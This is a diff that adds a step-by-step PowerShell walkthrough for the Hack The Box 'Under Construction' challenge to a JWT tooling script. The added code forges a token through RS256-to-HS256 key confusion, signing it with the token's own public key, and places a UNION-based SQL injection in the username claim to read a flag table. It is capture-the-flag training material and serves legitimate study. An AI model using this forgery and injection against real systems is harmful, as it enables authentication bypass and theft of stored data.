@@ -134,4 +134,42 @@ foreach ($secret in $wordList)
         }
     }
 }
+
+
+# Hack The Box "Under Construction" walkthrough
+# 1. JWT after registration and authentication:
+$jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MDgyMzkzMTd9.siXge7yRMiG7jE-lUef_mRCQ0ZY3YGPd-0psdjXoHU3CYSl3YkhpWiw724Ns9J_HVkGzsJBd0ZPRKpPdGL0MIaz2iS9IAqNnfdeM36cZpS5MHQT-zI3K2xfZQD2vjU4uyVmxSrSr1YOxFez1Mt6j-lkEiApX4uDwenysYvtNZ5rSiKipyhh03-tSZQJp3zR8YK6ileGy9KTRfGrjRz7_7CfGikGufJuGDaSBNCGKcMvPRJcotM6hWT5hXBW7JTXN62GZqabrXeSkz1DgMxntR5-iOmntLsdJyLhSKNi9jLx-fI3ticBc--70trVYSbV7kowBNtpHWrdvtefh5pgO1A"
+
+# 2. Payload as a hashtable:
+$payload = $jwt | Get-JsonWebTokenPayload 
+
+# 3. Decoded JWT and this is where we see the "pk" claim with the public key:
+$jwt | DecodeJwt | Format-List
+
+# 4. Get the public key:
+$key = $payload.pk
+
+# 5. Copy of the payload we're going to alter:
+$newPayload = $payload
+
+# 6. SQL injection which is the user name value followed by the query:
+$query = "tony' AND 1=0 UNION SELECT 1,(SELECT top_secret_flaag FROM flag_storage),3;--"
+
+# 7. Change the user name from "tony" to the above SQL query:
+$newPayload.username = $query
+
+# 8. Repackage JWT payload:
+$newEncodedPayload = $newPayload | ConvertTo-JwtPart
+
+# 9. Create a new header which has an alg of HS256 as opposed to the prior value of RS256:
+$newHeader = @{typ="JWT";alg="HS256"} | ConvertTo-JwtPart
+
+# 10. Concatentate the header and payload:
+$jwtSansSig = "$newHeader.$newEncodedPayload"
+
+# 11. Sign the above header and paylod:
+$sig = New-JwtSignature -JsonWebToken $jwtSansSig -HashAlgorithm SHA256 -Key $key
+
+# 12. Join the header, payload and signature:
+$newJwt = "$jwtSansSig.$sig"
 ```
